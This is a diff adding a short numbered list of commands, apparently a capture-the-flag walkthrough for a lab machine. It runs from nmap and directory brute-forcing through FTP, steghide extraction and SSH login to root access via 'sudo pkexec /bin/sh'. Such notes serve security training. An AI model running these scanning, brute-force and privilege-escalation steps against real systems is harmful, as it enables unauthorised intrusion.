@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.23.118
+2 - gobuster dir -u http://10.10.23.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - view-source:http://10.10.23.118/island/
+4 - view-soruce:http://10.10.23.118/island/2100/
+5 - wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.23.118/island/2100/FUZZ.ticket
+6 - view-source:http://10.10.23.118/island/2100/green_arrow.ticket -> BASE58 DECODE
+7 - ftp 10.10.23.118
+8 - steghide extract -sf aa.jpg
+9 - ssh slade@10.10.23.118
+10 - cat user.txt
+11 - sudo -l (pkexec)
+12 - sudo pkexec /bin/sh
+13 - cat root.txt
